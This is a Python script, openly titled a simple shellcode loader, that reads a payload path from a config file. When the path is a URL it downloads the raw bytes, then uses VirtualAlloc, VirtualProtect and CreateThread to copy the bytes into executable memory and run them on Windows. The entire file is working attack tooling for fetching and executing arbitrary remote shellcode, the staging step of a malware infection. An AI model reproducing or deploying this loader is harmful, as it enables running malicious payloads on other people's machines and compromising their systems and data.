"""
createThread.py - Simple shellcode loader using CreateThread
Python version using ctypes for Win32 API calls.
Run on Windows: python createThread.py
"""
import ctypes
import ctypes.wintypes
import sys
import os

kernel32 = ctypes.windll.kernel32

PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
INFINITE = 0xFFFFFFFF

def load_payload():
    config_paths = [
        os.path.join(os.getcwd(), "config.conf"),
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.conf"),
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "config.conf"),
    ]

    payload_path = None
    for cp in config_paths:
        print(f"[i] Looking for config at: {cp}")
        if os.path.exists(cp):
            print(f"[+] Found config.conf at: {cp}")
            config_dir = os.path.dirname(cp)
            with open(cp) as f:
                for line in f:
                    line = line.strip()
                    if line.startswith("payload_path="):
                        payload_path = line.split("=", 1)[1]
                        break
            break

    if not payload_path:
        print("[-] config.conf not found or no payload_path")
        sys.exit(1)

    # Resolve relative path
    if not os.path.isabs(payload_path):
        payload_path = os.path.join(config_dir, "..", payload_path.replace("\\", os.sep))

    payload_path = os.path.normpath(payload_path)
    print(f"[*] Step 1: Downloading payload")

    if payload_path.startswith("http"):
        import urllib.request
        print(f"[+] Target is a URL. Downloading from: {payload_path}")
        response = urllib.request.urlopen(payload_path)
        shellcode = response.read()
    else:
        print(f"[+] Target is a local file. Loading from: {payload_path}")
        with open(payload_path, "rb") as f:
            shellcode = f.read()

    print(f"[+] Loaded {len(shellcode)} bytes")
    return shellcode

def main():
    shellcode = load_payload()

    print("[*] Step 2: Allocating memory (RW)")
    ptr = kernel32.VirtualAlloc(
        ctypes.c_void_p(0),
        len(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    )
    if not ptr:
        print(f"[-] VirtualAlloc failed (Error: {kernel32.GetLastError()})")
        sys.exit(1)
    print(f"[+] Allocated memory at: 0x{ptr:016x}")

    print("[*] Step 3: Copying payload to allocated memory")
    ctypes.memmove(ptr, shellcode, len(shellcode))

    print("[*] Step 4: Changing memory protection (RW -> RX)")
    old_protect = ctypes.wintypes.DWORD(0)
    kernel32.VirtualProtect(
        ctypes.c_void_p(ptr),
        len(shellcode),
        PAGE_EXECUTE_READ,
        ctypes.byref(old_protect)
    )
    print(f"[+] VirtualProtect succeeded, old protect: 0x{old_protect.value:x}")

    print("[*] Step 5: Executing payload via CreateThread")
    thread_handle = kernel32.CreateThread(
        ctypes.c_void_p(0), 0,
        ctypes.c_void_p(ptr),
        ctypes.c_void_p(0), 0,
        ctypes.c_void_p(0)
    )
    if not thread_handle:
        print(f"[-] CreateThread failed (Error: {kernel32.GetLastError()})")
        sys.exit(1)

    print(f"[+] Thread created successfully")
    kernel32.WaitForSingleObject(thread_handle, INFINITE)

if __name__ == "__main__":
    main()
